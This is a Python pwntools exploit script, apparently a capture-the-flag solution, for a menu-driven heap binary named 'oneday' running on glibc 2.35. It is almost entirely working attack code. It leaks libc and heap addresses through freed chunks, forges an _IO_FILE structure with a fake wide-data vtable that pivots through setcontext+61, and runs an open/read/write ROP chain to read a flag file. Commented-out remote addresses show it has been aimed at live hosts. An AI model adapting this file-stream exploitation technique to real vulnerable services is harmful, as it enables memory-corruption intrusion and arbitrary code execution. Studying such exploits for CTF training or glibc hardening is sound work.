from pwn import *
from pwncli import *

# from struct import pack
# from ctypes import *

# io = remote("127.0.0.1", 55299)
# io = remote("192.168.170.128", 1234)
# io = remote("competition.blue-whale.me", 20631)
# io = remote("182.92.237.102", 10015)
io = process("./oneday")
# io = remote("3.1.2.3", 8888)
# context(os="linux", arch="amd64")
context(os="linux", arch="amd64", log_level="debug")
elf = ELF('./oneday')
# libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('/home/yukon/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')
lg_infos = []
lga = lambda data: lg_infos.append(data)
s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda text, data: io.sendafter(text, data)
sla = lambda text, data: io.sendlineafter(text, data)
r = lambda n: io.recv(n)
ru = lambda text: io.recvuntil(text)
rl = lambda: io.recvline()
uu32 = lambda: u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))
uu64 = lambda: u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda: int(io.recv(10), 16)
iuu64 = lambda: int(io.recv(6), 16)
uheap = lambda: u64(io.recv(6).ljust(8, b'\x00'))
# lg = lambda addr: log.success(addr)
# lg = lambda addr: log.info(addr)
lg = lambda data: io.success('%s -> 0x%x' % (data, eval(str(data))))


# ia = lambda: io.interactive()

def log_all():
    for lg_info in lg_infos:
        lg(lg_info)


def ia():
    log_all()
    io.interactive()


def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))


def get_IO_str_jumps():
    IO_file_jumps_offset = libc.sym['_IO_file_jumps']
    IO_str_underflow_offset = libc.sym['_IO_str_underflow']
    for ref_offset in libc.search(p64(IO_str_underflow_offset)):
        possible_IO_str_jumps_offset = ref_offset - 0x20
        if possible_IO_str_jumps_offset > IO_file_jumps_offset:
            print(possible_IO_str_jumps_offset)
            return possible_IO_str_jumps_offset


def add(choice):
    io.recvuntil(b'enter your command: \n')
    io.sendline(b'1')
    io.recvuntil(b'choise: ')
    io.sendline(str(choice).encode())


def delete(idx):
    io.recvuntil(b'enter your command: \n')
    io.sendline(b'2')
    io.recvuntil(b'Index: \n')
    io.sendline(str(idx).encode())


def edit(idx, message):
    io.recvuntil(b'enter your command: \n')
    io.sendline(b'3')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Message: \n')
    io.send(message)


def show(idx):
    io.recvuntil(b'enter your command: \n')
    io.sendline(b'4')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())


def exit():
    io.recvuntil(b'enter your command: \n')
    io.sendline(b'9')


# gdb.attach(io)
# gdb.attach(io, 'b printf')
# gdb.attach(io, 'b *0x4011B4')


sla(b'enter your key >>\n', str(10).encode())
add(2)  # 0
add(2)  # 1
add(1)  # 2
delete(2)
delete(1)
delete(0)

add(1)  # 3
add(1)  # 4
add(1)  # 5
add(1)  # 6
delete(3)
delete(5)
show(3)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1f2cc0 - 0x28020
lga("libc_base")
io.recv(2)
heap_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x17f0
lga("heap_base")
delete(4)
delete(6)
add(3)  # 7
add(1)  # 8
add(1)  # 9
delete(8)
add(3)  # 10

target_addr = libc_base + libc.sym['_IO_list_all']
_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
_IO_wstrn_jumps = libc_base + 0x216dc0  # + 0x1f3d20
_IO_cookie_jumps = libc_base + 0x216b80  # + 0x1f3ae0
_lock = libc_base + 0x21ca60  # 0x1f5720
set_context_61 = libc_base + libc.sym["setcontext"] + 61

lga("_IO_wfile_jumps")
lga("_IO_wstrn_jumps")
lga("_IO_cookie_jumps")
lga("_lock")

pop_rdi = libc_base +0x000000000002a3e5
pop_rdx_r12_ret = libc_base + 0x000000000011f2e7
pop_rax = libc_base + 0x0000000000045eb0
pop_rsi = libc_base + 0x000000000002be51
ret = libc_base + 0x0000000000029139
leave_ret = libc_base + 0x000000000004da83
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']

fake_IO_FILE = heap_base + 0x1810
orw_addr = fake_IO_FILE + 0x300 + 0x10
lga("fake_IO_FILE")
lga("orw_addr")
lga("set_context_61")

# open('./flag.txt', 0)
# read(3, bss + 0x200, 0x20)
# write(1, bss + 0x200, 0x20)
orw = [ret, pop_rdi, fake_IO_FILE + 0x300, pop_rsi, 0, open_addr,
       pop_rdi, 3, pop_rsi, fake_IO_FILE + 0x400, pop_rdx_r12_ret, 0x20, 0, read_addr,
       pop_rdi, 1, pop_rsi, fake_IO_FILE + 0x400, write_addr]

f1 = IO_FILE_plus_struct()
f1.flags = b'  hack!'
f1._IO_read_ptr = 0xa81
f1._IO_buf_base = p64(orw_addr)
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xe0
f1.vtable = _IO_wfile_jumps

data = flat({
    0x8: target_addr - 0x20,
    0x10: {
        0: {
            0: bytes(f1),
            # fake_wide_data
            0xe0: {  # _wide_data->_wide_vtable
                0x18: 0,  # f->_wide_data->_IO_write_base
                0x30: 0,  # f->_wide_data->_IO_buf_base
                0xa0: orw_addr,  # setcontext61 rdx+0xa0
                0xa8: ret,  # setcontext61 rdx+0xa8
                0xe0: fake_IO_FILE + 0x200,  # f->_wide_data->_wide_vtable
            },
            # fake_wide_vtable
            0x200: {
                0x68: set_context_61  # *(fp->_wide_data->_wide_vtable + 0x68)  backdoor
            },
            0x300: {
                0: b'/flag\x00\x00\x00',
                # open('/flag\x00\x00\x00', 0)
                0x10: orw
                # pop_rdi,
                # 0x10: fake_IO_FILE + 0x200,
                # 0x18: pop_rsi,
                # 0x20: 0,
                # 0x30:
            }
        },
        0xa80: [0, 0xab1]
    }
})

edit(5, data)
# log_all()
# gdb.attach(io, "tele $rebase(0x202040) 0x20")
delete(2)
add(3)
exit()

ia()
# io\.recvuntil\("(.*?)"\)
# io\.recvuntil\(b"$1"\)
# io\.sendline\(str\((.*?)\)\)
# io\.sendline\(str\($1\)\.encode\(\)\)




